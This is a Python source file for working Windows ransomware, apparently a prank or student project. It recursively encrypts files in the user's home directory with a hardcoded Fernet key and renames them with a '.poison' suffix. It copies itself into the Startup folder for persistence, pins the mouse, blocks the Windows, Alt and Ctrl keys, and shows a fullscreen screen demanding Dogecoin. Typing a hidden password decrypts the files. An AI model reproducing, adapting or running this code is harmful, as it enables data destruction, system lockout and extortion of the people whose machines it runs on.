import keyboard
from tkinter import *
import tkinter as tk
import mouse
import winreg
import shutil
from getpass import getuser
from pathlib import Path
from typing import Final
import threading
from cryptography.fernet import Fernet
import os
import sys
import time

global executing
global filename
executing = True
filename = "".join(["\\", __file__.split('\\')[-1].split('.')[0], ".exe"])
KEY: Final = b'171yM5aII7w0cM2C0EtD9yOlU71d4vooktwHOIsoZ6I='
DEST_PATH: Final = f"C:\\Users\\{getuser()}"
DIR_EXCLUSIONS: Final = [".vscode", "AppData", "encrypt.py", ".git", "Searches"]
FILE_SUFFIX: Final = "poison"
FILE_SUFFIX_EXCLUSIONS: Final = [FILE_SUFFIX, "exe", "ini", "DAT", "LOG1", "LOG2", "blf", "regtrans-ms", "gitconfig"]
URL: Final = ("https://ia903206.us.archive.org/31/items/rick-astley-never-gonna-give-you-up/Rick%20Astley%20-%20Never%20Gonna%20Give%20You%20Up.mp3")


class Encryption(threading.Thread):
    def __init__(self, KEY, FILE_SUFFIX, DEST_PATH, DIR_EXCLUSIONS, FILE_SUFFIX_EXCLUSIONS, stop):
        threading.Thread.__init__(self)
        self.DEST_PATH = DEST_PATH
        self. DIR_EXCLUSIONS = DIR_EXCLUSIONS
        self.FILE_SUFFIX_EXCLUSIONS = FILE_SUFFIX_EXCLUSIONS
        self.KEY = KEY
        self.FILE_SUFFIX = FILE_SUFFIX
        self.stop = stop

    def getDecryptedFiles(self):
        file_paths = []
        filtered_file_paths = []

        for root, dirs, files in os.walk(DEST_PATH):
            for file in files:
                full_path = f"{root}\\{file}"
                if (not file.split(".")[-1] in FILE_SUFFIX_EXCLUSIONS):
                    file_paths.append(full_path)
        
        for file_path in file_paths:
            exception = False
            for dir_exclusion in DIR_EXCLUSIONS:
                if (file_path.__contains__(dir_exclusion)):
                    exception = True
            if (not exception):
                print(file_path)
                filtered_file_paths.append(file_path)

        return filtered_file_paths

    def stopThread(self):
        self.stop = True

    def encryptFiles(self, file_paths):
        for file in file_paths:
            with open(file, "rb") as binary_file:
                content = binary_file.read()
            encrypted_content = Fernet(self.KEY).encrypt(content)
            with open(file, "wb") as binary_file:
                binary_file.write(encrypted_content)
            os.rename(file, f"{file}.{self.FILE_SUFFIX}")

            if (self.stop):
                break

    def run(self):
        self.encryptFiles(self.getDecryptedFiles())


class Decryption(threading.Thread):
    def __init__(self, KEY, FILE_SUFFIX, DEST_PATH, DIR_EXCLUSIONS):
        threading.Thread.__init__(self)
        self.DEST_PATH = DEST_PATH
        self. DIR_EXCLUSIONS = DIR_EXCLUSIONS
        self.KEY = KEY
        self.FILE_SUFFIX = FILE_SUFFIX

    def getEencryptedFiles(self):
        file_paths = []
        for root, dirs, files in os.walk(self.DEST_PATH):
            for file in files:
                if (not root.split("\\")[-1] in self.DIR_EXCLUSIONS):
                    full_path = f"{root}\\{file}"
                    if (file.__contains__(self.FILE_SUFFIX)):
                        file_paths.append(full_path)
        return file_paths

    def decryptFiles(self, file_paths):
        for file in file_paths:
            with open(file, "rb") as binary_file:
                content = binary_file.read()
            decrypted_content = Fernet(self.KEY).decrypt(content)
            with open(file, "wb") as binary_file:
                try:
                    binary_file.write(decrypted_content)
                except:
                    print("error")
            os.rename(file, file.replace(f".{self.FILE_SUFFIX}", ""))

    def run(self):
        self.decryptFiles(self.getEencryptedFiles())


# Instances
ec = Encryption(KEY, FILE_SUFFIX, DEST_PATH,
                DIR_EXCLUSIONS, FILE_SUFFIX_EXCLUSIONS, False)
dc = Decryption(KEY, FILE_SUFFIX, DEST_PATH, DIR_EXCLUSIONS)
window = tk.Tk()


def create_autostart_regedit():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             "Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "encryt_py", 0, winreg.REG_SZ,
                          f"{Path.cwd()}{filename}")
    except:
        print("error")


def create_autostart_dir():
    startup = f"C:\\Users\\{getuser()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
    try:
        shutil.copy(f"{Path.cwd()}{filename}", startup)
    except:
        print("error")


def remove_autostart_dir():
    startup = f"C:\\Users\\{getuser()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
    try:
        shutil.copy(f"{Path.cwd()}{filename}", startup)
        os.remove(f"{startup}{filename}")
    except:
        print("error")


def disable_mouse():
    global executing
    while executing:
        mouse.move(1, 0, absolute=True, duration=0)


def block_keys():
    keyboard.block_key("linke windows")
    keyboard.block_key("rechte windows")
    keyboard.block_key("left windows")
    keyboard.block_key("right windows")
    keyboard.block_key("alt")
    keyboard.block_key("strg")
    keyboard.wait()


def read_input_field():
    current_input = entry.get()
    return current_input


def stop_torture(event):
    if (read_input_field() == "python"):
        ec.stopThread()
        remove_autostart_dir()
        dc.start()
        while (dc.is_alive()):
            time.sleep(3)
        window.destroy()
        sys.exit()
    elif(read_input_field() == "exit"):
        ec.stopThread()
        # remove_autostart_dir()
        window.destroy()
        sys.exit()

def on_closing():
    pass


window.attributes("-fullscreen", True, "-topmost", True)
window.title("u fucked up")
window.configure(bg="red")
window.bind('<Return>', stop_torture)
window.protocol("WM_DELETE_WINDOW", on_closing)

title = tk.Label(window, bg="red", fg="white",
                 text="uups, u fucked up :DD", font=("Comic Sans MS", 40))
title.pack(padx=30, pady=30)

ransom = tk.Label(window, bg="red", fg="white", text="All your files have been encrypted. If you want to decrypt them, pay 10 Dogecoins to the following address: 'in21-25a.ch'. We will then give you a decryption key",
                  font=("Comic Sans MS", 30), wraplength=1200)
ransom.pack(padx=50, pady=70)
entry = Entry(window, fg='red', font=('Comic Sans MS', 30))
entry.pack()
entry.focus()
snake = tk.Label(window, bg="red", fg="white", text="""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⡉⠙⣻⣷⣶⣤⣀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⡿⠋⠀⠀⠀⠀⢹⣿⣿⡟⠉⠉⠉⢻⡿⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠰⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⣿⣿⣇⠀⠀⠀⠈⠇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠉⠛⠿⣷⣤⡤⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣶⣦⣤⣤⣀⣀⣀⡀⠉⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀
⠀⠀⠀⢀⣀⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠙⠛⠿⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀
⠀⠀⣰⣿⣿⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣧⠀⠀
⠀⠀⣿⣿⣿⠁⠀⠈⠙⢿⣿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⠀⠀
⠀⠀⢿⣿⣿⣆⠀⠀⠀⠀⠈⠛⠿⣿⣶⣦⡤⠴⠀⠀⠀⠀⠀⣸⣿⣿⣿⡿⠀⠀
⠀⠀⠈⢿⣿⣿⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⠃⠀⠀
⠀⠀⠀⠀⠙⢿⣿⣿⣿⣶⣦⣤⣀⣀⡀⠀⠀⠀⣀⣠⣴⣾⣿⣿⣿⡿⠃⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠙⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⠛⠛⠛⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀
""", font=("Arial", 22))
snake.pack(pady=20)

# create_autostart_regedit()
create_autostart_dir()

threading.Thread(target=disable_mouse, daemon=True).start()
threading.Thread(target=block_keys, daemon=True).start()

ec.start()

window.mainloop()
